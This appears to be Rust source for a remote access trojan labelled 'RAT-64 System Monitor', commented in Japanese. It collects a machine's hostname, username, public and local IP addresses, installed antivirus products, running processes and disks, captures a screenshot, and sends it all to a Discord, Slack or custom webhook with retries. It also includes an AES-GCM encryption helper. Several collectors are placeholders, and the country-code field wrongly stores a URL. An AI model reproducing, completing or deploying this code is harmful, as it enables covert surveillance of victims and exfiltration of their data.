use std::process::Command;
use serde::{Serialize, Deserialize};
use reqwest::blocking::Client;
use base64::{engine::general_purpose, Engine as _};
use whoami;
use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
use std::time::Duration;

pub mod decrypt;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SystemInfo {
    pub hostname: String,
    pub os_name: String,
    pub os_version: String,
    pub username: String,
    pub global_ip: String,
    pub local_ip: String,
    pub cores: usize,
    pub security_software: Vec<String>,
    pub processor: String,
    pub country_code: String,
    // 詳細情報
    pub total_memory: u64,
    pub available_memory: u64,
    pub disk_info: Vec<DiskInfo>,
    pub network_interfaces: Vec<NetworkInterface>,
    pub running_processes: Vec<ProcessInfo>,
    pub installed_software: Vec<String>,
    pub startup_programs: Vec<String>,
    pub system_uptime: u64,
    pub timezone: String,
    pub language: String,
    pub architecture: String,
    pub boot_time: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DiskInfo {
    pub name: String,
    pub file_system: String,
    pub total_space: u64,
    pub available_space: u64,
    pub mount_point: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct NetworkInterface {
    pub name: String,
    pub ip_addresses: Vec<String>,
    pub mac_address: String,
    pub is_up: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProcessInfo {
    pub name: String,
    pub pid: u32,
    pub cpu_usage: f32,
    pub memory_usage: u64,
    pub exe_path: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FullSystemData {
    pub system_info: SystemInfo,
    pub screenshot: String,
    pub webcam_image: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Config {
    pub webhook_url: Option<String>,
    pub webhook_type: WebhookType,
    pub collect_screenshots: bool,
    pub collect_webcam: bool,
    pub collect_processes: bool,
    pub collect_software: bool,
    pub max_processes: usize,
    pub retry_attempts: u32,
    pub timeout_seconds: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum WebhookType {
    Discord,
    Slack,
    Custom,
    None,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            webhook_url: None,
            webhook_type: WebhookType::None,
            collect_screenshots: true,
            collect_webcam: false,
            collect_processes: true,
            collect_software: true,
            max_processes: 20,
            retry_attempts: 3,
            timeout_seconds: 30,
        }
    }
}

// システム情報収集
pub fn get_system_info() -> SystemInfo {
    let mut sys = sysinfo::System::new_all();
    sys.refresh_all();
    
    let hostname = whoami::fallible::hostname().unwrap_or_default();
    let info = os_info::get();
    let os_name = info.os_type().to_string();
    let os_version = info.version().to_string();
    let username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_default();

    let global_ip = reqwest::blocking::get("https://api.ipify.org")
        .and_then(|r| r.text())
        .unwrap_or_default();
    let local_ip = local_ipaddress::get().unwrap_or_default();

    let country_code = format!("https://ipapi.co/{}/json", global_ip);
    let _country_response = reqwest::blocking::get(&country_code)
        .and_then(|r| r.text())
        .unwrap_or_default();

    let cores = sys.cpus().len();
    let security_software = get_antivirus_software();
    let processor = sys.cpus().first()
        .map(|cpu| cpu.brand().to_string())
        .unwrap_or_default();

    let total_memory = sys.total_memory();
    let available_memory = sys.available_memory();
    let disk_info = get_disk_info(&sys);
    let network_interfaces = get_network_interfaces();
    let running_processes = get_running_processes(&sys);
    let installed_software = get_installed_software();
    let startup_programs = get_startup_programs();
    let system_uptime = 0; // Placeholder
    let timezone = std::env::var("TZ").unwrap_or_else(|_| "UTC".to_string());
    let language = std::env::var("LANG").unwrap_or_else(|_| "en_US".to_string());
    let architecture = std::env::consts::ARCH.to_string();
    let boot_time = "Unknown".to_string();

    SystemInfo {
        hostname, os_name, os_version, username, global_ip, local_ip, cores,
        security_software, processor, country_code, total_memory, available_memory,
        disk_info, network_interfaces, running_processes, installed_software,
        startup_programs, system_uptime, timezone, language, architecture, boot_time,
    }
}

fn get_antivirus_software() -> Vec<String> {
    if cfg!(windows) {
        let output = Command::new("powershell")
            .args([
                "-Command",
                "Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct | Select-Object -ExpandProperty displayName"
            ])
            .output();

        if let Ok(out) = output {
            let text = String::from_utf8_lossy(&out.stdout);
            text.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()
        } else {
            vec!["Windows Defender".to_string()]
        }
    } else {
        vec![]
    }
}

fn get_disk_info(_sys: &sysinfo::System) -> Vec<DiskInfo> {
    use sysinfo::Disks;
    let disks = Disks::new_with_refreshed_list();
    disks.iter().map(|disk| {
        DiskInfo {
            name: disk.name().to_string_lossy().to_string(),
            file_system: disk.file_system().to_string_lossy().to_string(),
            total_space: disk.total_space(),
            available_space: disk.available_space(),
            mount_point: disk.mount_point().to_string_lossy().to_string(),
        }
    }).collect()
}

fn get_network_interfaces() -> Vec<NetworkInterface> {
    vec![NetworkInterface {
        name: "Default".to_string(),
        ip_addresses: vec![local_ipaddress::get().unwrap_or_default()],
        mac_address: "Unknown".to_string(),
        is_up: true,
    }]
}

fn get_running_processes(sys: &sysinfo::System) -> Vec<ProcessInfo> {
    sys.processes().iter().take(20).map(|(pid, process)| {
        ProcessInfo {
            name: process.name().to_string_lossy().to_string(),
            pid: pid.as_u32(),
            cpu_usage: process.cpu_usage(),
            memory_usage: process.memory(),
            exe_path: process.exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|| "Unknown".to_string()),
        }
    }).collect()
}

fn get_installed_software() -> Vec<String> {
    vec!["System Default Applications".to_string()]
}

fn get_startup_programs() -> Vec<String> {
    vec!["System Startup Programs".to_string()]
}

// 設定管理
pub fn load_config() -> Config {
    match std::fs::read_to_string("config.json") {
        Ok(content) => serde_json::from_str(&content).unwrap_or_default(),
        Err(_) => {
            let default_config = Config::default();
            create_default_config(&default_config);
            default_config
        }
    }
}

pub fn create_default_config(config: &Config) {
    if let Ok(json) = serde_json::to_string_pretty(config) {
        let _ = std::fs::write("config.json", json);
        println!("設定ファイル config.json を作成しました");
    }
}

// Webhook機能
pub fn send_webhook(config: &Config, system_info: &SystemInfo, screenshot: &str) -> Result<(), Box<dyn std::error::Error>> {
    let webhook_url = match &config.webhook_url {
        Some(url) => url,
        None => return Ok(()),
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(config.timeout_seconds))
        .build()?;

    let payload = match config.webhook_type {
        WebhookType::Discord => create_discord_payload(system_info, screenshot),
        WebhookType::Slack => create_slack_payload(system_info, screenshot),
        WebhookType::Custom => create_custom_payload(system_info, screenshot),
        WebhookType::None => return Ok(()),
    };

    for attempt in 1..=config.retry_attempts {
        let payload_str = payload.to_string();
        let preview = truncate_utf8_safe(&payload_str, 200);
        println!("🔍 送信ペイロード (試行{}): {}...", attempt, preview);
        
        match client.post(webhook_url)
            .header("Content-Type", "application/json")
            .body(payload_str)
            .send() {
            Ok(response) if response.status().is_success() => {
                println!("✅ Webhook送信成功 ({}回目の試行)", attempt);
                return Ok(());
            }
            Ok(response) => {
                let status = response.status();
                let response_text = response.text().unwrap_or_default();
                println!("⚠️  Webhook送信失敗: {} ({}回目の試行)", status, attempt);
                println!("📝 レスポンス詳細: {}", response_text);
            }
            Err(e) => {
                println!("❌ Webhook送信エラー: {} ({}回目の試行)", e, attempt);
            }
        }
        
        if attempt < config.retry_attempts {
            std::thread::sleep(Duration::from_secs(2));
        }
    }
    
    Err("Webhook送信に失敗しました".into())
}

fn truncate_utf8_safe(s: &str, max_len: usize) -> String {
    s.chars().take(max_len).collect()
}

fn create_discord_payload(system_info: &SystemInfo, _screenshot: &str) -> serde_json::Value {
    let timestamp = "2025-09-21T00:00:00Z";
    
    let security_software = if system_info.security_software.is_empty() {
        "なし".to_string()
    } else {
        truncate_utf8_safe(&system_info.security_software.join(", "), 100)
    };
    
    let ip_info = format!("Global: {}\nLocal: {}", 
        truncate_utf8_safe(&system_info.global_ip, 50),
        truncate_utf8_safe(&system_info.local_ip, 50));
    
    let os_info = format!("{} {}", 
        truncate_utf8_safe(&system_info.os_name, 20),
        truncate_utf8_safe(&system_info.os_version, 20));

    serde_json::json!({
        "embeds": [{
            "title": "🖥️ システム情報レポート",
            "color": 65280,
            "fields": [
                {"name": "🏠 ホスト名", "value": truncate_utf8_safe(&system_info.hostname, 100), "inline": true},
                {"name": "💻 OS", "value": os_info, "inline": true},
                {"name": "👤 ユーザー", "value": truncate_utf8_safe(&system_info.username, 50), "inline": true},
                {"name": "⚙️ CPU", "value": format!("{} ({} cores)", 
                    truncate_utf8_safe(&system_info.processor, 30), 
                    system_info.cores), "inline": true},
                {"name": "💾 メモリ", "value": format!("{:.1}GB / {:.1}GB", 
                    system_info.available_memory as f64 / 1024.0 / 1024.0 / 1024.0,
                    system_info.total_memory as f64 / 1024.0 / 1024.0 / 1024.0), "inline": true},
                {"name": "🌐 IP情報", "value": ip_info, "inline": true},
                {"name": "🔒 セキュリティ", "value": security_software, "inline": true},
                {"name": "📊 プロセス", "value": format!("{}個実行中", system_info.running_processes.len()), "inline": true}
            ],
            "timestamp": timestamp,
            "footer": {"text": "RAT-64 System Monitor"}
        }]
    })
}

fn create_slack_payload(system_info: &SystemInfo, _screenshot: &str) -> serde_json::Value {
    serde_json::json!({
        "blocks": [
            {
                "type": "header",
                "text": {"type": "plain_text", "text": "🖥️ システム情報レポート"}
            },
            {
                "type": "section",
                "fields": [
                    {"type": "mrkdwn", "text": format!("*ホスト名:*\n{}", system_info.hostname)},
                    {"type": "mrkdwn", "text": format!("*OS:*\n{} {}", system_info.os_name, system_info.os_version)},
                    {"type": "mrkdwn", "text": format!("*ユーザー:*\n{}", system_info.username)},
                    {"type": "mrkdwn", "text": format!("*CPU:*\n{} ({} cores)", system_info.processor, system_info.cores)}
                ]
            }
        ]
    })
}

fn create_custom_payload(system_info: &SystemInfo, screenshot: &str) -> serde_json::Value {
    serde_json::json!({
        "timestamp": std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
        "system_info": system_info,
        "screenshot": if screenshot.is_empty() { serde_json::Value::Null } else { serde_json::Value::String(screenshot.to_string()) }
    })
}

// 画像取得
pub fn get_screenshot_base64() -> String {
    let display = match scrap::Display::primary() {
        Ok(d) => d,
        Err(_) => return String::new(),
    };

    let mut capturer = match scrap::Capturer::new(display) {
        Ok(c) => c,
        Err(_) => return String::new(),
    };

    let (w, h) = (capturer.width(), capturer.height());
    
    loop {
        match capturer.frame() {
            Ok(buffer) => {
                let mut image_buffer = image::ImageBuffer::new(w as u32, h as u32);
                
                for (i, pixel) in buffer.chunks_exact(4).enumerate() {
                    let x = (i % w) as u32;
                    let y = (i / w) as u32;
                    
                    if y < h as u32 {
                        image_buffer.put_pixel(x, y, image::Rgba([pixel[2], pixel[1], pixel[0], 255]));
                    }
                }
                
                let mut png_data = Vec::new();
                if image::DynamicImage::ImageRgba8(image_buffer)
                    .write_to(&mut std::io::Cursor::new(&mut png_data), image::ImageFormat::Png)
                    .is_ok() {
                    return general_purpose::STANDARD.encode(&png_data);
                }
                break;
            }
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(std::time::Duration::from_millis(16));
                continue;
            }
            Err(_) => break,
        }
    }
    
    String::new()
}

pub fn get_webcam_image_base64() -> String {
    String::new() // Placeholder
}

// 暗号化
pub fn encrypt_data(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, String> {
    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
    cipher.encrypt(Nonce::from_slice(nonce), data)
        .map_err(|e| format!("Encryption failed: {:?}", e))
}